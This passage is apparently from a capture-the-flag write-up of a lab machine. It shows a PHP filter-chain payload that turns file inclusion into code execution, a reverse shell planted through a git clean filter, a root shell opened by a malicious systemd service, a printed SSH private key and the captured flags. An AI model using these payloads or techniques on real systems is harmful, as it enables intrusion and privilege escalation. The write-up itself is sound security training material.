1.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&"}'
```

Back in our netcat listener on port 3322:

```bash
$nc -lvnp 3322
Listening on 0.0.0.0 3322
Connection received on 10.10.11.198 36524
bash: cannot set terminal process group (816): Inappropriate ioctl for device
bash: no job control in this shell
www-data@encoding:~/image/actions$ ls -la /home
ls -la /home
total 12
drwxr-xr-x  3 root root 4096 Jan 13 16:25 .
drwxr-xr-x 19 root root 4096 Jan 13 16:25 ..
drwxr-x---  5 svc  svc  4096 Jan 23 18:23 svc
www-data@encoding:~/image/actions$ cat /home/svc/user.txt
cat /home/svc/user.txt
cat: /home/svc/user.txt: Permission denied
```

We don't have the user flag yet, but we have a reverse shell! It's also worth mentioning here I had to try a few PHP reverse shells encoded as PHP filters before the above worked.  There's a lot of trial and error that I don't include in write ups for brevity.

Are we able to run anything as `sudo` with the www-data user?:

```bash
www-data@encoding:~/image/actions$ sudo -l
sudo -l
Matching Defaults entries for www-data on encoding:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User www-data may run the following commands on encoding:
    (svc) NOPASSWD: /var/www/image/scripts/git-commit.sh

www-data@encoding:~/image/actions$ cat /var/www/image/scripts/git-commit.sh
cat /var/www/image/scripts/git-commit.sh
#!/bin/bash

u=$(/usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image ls-files  -o --exclude-standard)

if [[ $u ]]; then
        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image add -A
else
        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image commit -m "Commited from API!" --author="james <james@haxtables.htb>"  --no-verify
fi
www-data@encoding:~/image/actions$
```

It appears we can run `sudo -u svc /var/www/image/scripts/git-commit.sh`, which will basically run `git ls-files` before adding any found unstaged files.  Failing this, it will call `git commit -m "Committed from API!"` . We can't add files directly to `/var/www/image`, but `getfacl` shows we (www-data) have write access to the `.git` directory:

```bash
www-data@encoding:/dev/shm$ getfacl /var/www/image/.git
getfacl: Removing leading '/' from absolute path names
# file: var/www/image/.git
# owner: svc
# group: svc
user::rwx
user:www-data:rwx
group::r-x
mask::rwx
other::r-x
```

Initially, I tried creating a few common git hooks before running `sudo -u svc /var/www/image/scripts/git-commit.sh`:

```bash
echo -e '#!/bin/sh\necho foo1' > /var/www/image/.git/hooks/commitmsg && cat /var/www/image/.git/hooks/commitmsg
chmod +x /var/www/image/.git/hooks/commitmsg

echo -e '#!/bin/sh\necho foo2' > /var/www/image/.git/hooks/pre-commit
chmod +x /var/www/image/.git/hooks/pre-commit

echo -e '#!/bin/sh\necho foo3' > /var/www/image/.git/hooks/prepare-commit-msg
chmod +x /var/www/image/.git/hooks/prepare-commit-msg
```

Unfortunately, this didn't work -- and as I found out, the `--no-verify` git flag skips git commit hooks.  Searching for git privilege escalation, I came across this: [Sudo Git Privilege Escalation | Exploit Notes](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-git-privilege-escalation/)

Reading the comprehensive (and free!) ProGit book online, I came across https://git-scm.com/book/en/v2/Customizing-Git-Git-Attributes and particularly filters.  In particular, the `indent` filter will run all your source code through the indent program before committing.

Let's see if this works when there's nothing to commit in the git repo staging area, and we run as `sudo`, while we have another reverse shell listening locally with `nc -lvnp 3344`:

```bash
www-data@encoding:~/image$ echo 'bash -c "bash -i >& /dev/tcp/10.10.14.62/3344 0>&1"' > /tmp/clean
<-i >& /dev/tcp/10.10.14.62/3344 0>&1"' > /tmp/clean
www-data@encoding:~/image$ chmod +x /tmp/clean
chmod +x /tmp/clean
www-data@encoding:~/image$ echo '*.php filter=indent' > /var/www/image/.git/info/attributes
<ilter=indent' > /var/www/image/.git/info/attributes
www-data@encoding:~/image$ cd /tmp
cd /tmp
www-data@encoding:/tmp$ git --git-dir=/var/www/image/.git --work-tree=/var/www/image config filter.indent.clean /tmp/clean
<var/www/image config filter.indent.clean /tmp/clean
www-data@encoding:/tmp$ sudo -u svc /var/www/image/scripts/git-commit.sh
sudo -u svc /var/www/image/scripts/git-commit.sh
```

You'll notice the output is a little wonky, probably because I struggled to upgrade to a fully interactive TTY.  So above we created our reverse shell in `/tmp/clean` marking it executable.  We apply the `indent` filter to `*.php` files, and we set the git repo's config to point to our `/tmp/clean` script for the indent filter.  Then we run the git script.  Back in our reverse shell:

```bash
$nc -lvnp 3344
Listening on 0.0.0.0 3344
Connection received on 10.10.11.198 56308
bash: cannot set terminal process group (783): Inappropriate ioctl for device
bash: no job control in this shell
svc@encoding:/var/www/image$ ls -la /home/svc
ls -la /home/svc
total 40
drwxr-x--- 5 svc  svc  4096 Jan 23 18:23 .
drwxr-xr-x 3 root root 4096 Jan 13 16:25 ..
lrwxrwxrwx 1 svc  svc     9 Nov 11 14:31 .bash_history -> /dev/null
-rw-r--r-- 1 svc  svc   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 svc  svc  3771 Jan  6  2022 .bashrc
drwx------ 3 svc  svc  4096 Jan 13 16:25 .cache
-rw-rw-r-- 1 svc  svc    85 Nov  8 16:37 .gitconfig
drwx------ 3 svc  svc  4096 Jan 13 16:25 .gnupg
-rw-r--r-- 1 svc  svc   807 Jan  6  2022 .profile
drwx------ 2 svc  svc  4096 Jan 13 16:25 .ssh
-rw-r----- 1 root svc    33 Apr  7 04:19 user.txt
svc@encoding:/var/www/image$ cat /home/svc/user.txt
cat /home/svc/user.txt
35560e566cec288d1c3217b0cd2a9023
svc@encoding:/var/www/image$ cat /home/svc/.ssh/id_rsa
cat /home/svc/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Sweet!  We got a reverse shell as the `svc` user, got the user flag, plus an SSH private key to help us log in via SSH -- so we get a nice interactive TTY. 

## Privilege Escalation

After SSHing in with `ssh -i id_rsa svc@haxtables.htb`, we see we can run `/usr/bin/systemctl restart *` as sudo:

```bash
svc@encoding:~$ sudo -l
Matching Defaults entries for svc on encoding:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on encoding:
    (root) NOPASSWD: /usr/bin/systemctl restart *
```



First I tried [Wildcards Spare tricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks), but `systemctl` kept escaping my bad input. My next thought was to see if I can create a systemd unit file with a reverse shell, and restart my new service..  Let's see which directories are writable by this user:

```bash
svc@encoding:/dev/shm$ find / -writable 2> /dev/null
.. snip ..
/etc/systemd/user/session-migration.service
/etc/systemd/system
```

We create a service called seashell, a reverse shell back to my machine.  We copy it into `/etc/systemd/system`, and restart it:

```bash
svc@encoding:/dev/shm$ cat seashell.service 
[Unit]
Description=sea shells by thes seashore
[Service]
RemainAfterExit=yes
Type=simple
ExecStart=/bin/bash -c "exec 5<>/dev/tcp/10.10.14.62/3322; cat <&5 | while read line; do $line 2>&5 >&5; done"

[Install]
WantedBy=default.target

svc@encoding:/dev/shm$ cp seashell.service /etc/systemd/system
svc@encoding:/dev/shm$ sudo -u root /usr/bin/systemctl restart seashell.service
```

And back in our netcat listener, we now have a root shell, plus the root flag!:

```bash
$nc -lvnp 3322
Listening on 0.0.0.0 3322
Connection received on 10.10.11.198 53080
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
ls
root.txt
scripts
cat root.txt
bfc3a64c2fca504300e71bc354bc9651
```

Done!

## Conclusion

I had read about PHP filter chains  a little while ago as a means of leveraging LFI to gain Remote Code Execution (LFI2RCE) -- and it was quite cool to finally try it out in a somewhat real-worldish setting.

I definitely got lost along the way and back tracked a few times -- log poisoning led me astray, and working towards SSRF took some time.  After this though, the path was fairly obvious, particularly privesc to the service account and root.

Any valuable lessons learnt?   While going deep is definitely valuable and required, I should consider approaches such as time boxing any 'bread crumbs', and making a decision to back track before trying something else -- it's exceptionally easy to get caught up on an attack vector that never actually eventuates at times.

I'm not sure of the best tool (logseq whiteboards?), but it would be cool to use a mind mapping app to track progress on CTFs and more easily see the paths tried, dead ends, etc.  Speaking of tools, I might try [Villain](https://github.com/t3l3machus/Villain) next time around, as a nice session manager for shells and alternative to netcat.  After seeing John Hammond demo Villain, and losing track of my open shells, it looks like the perfect tool for managing shell sessions.
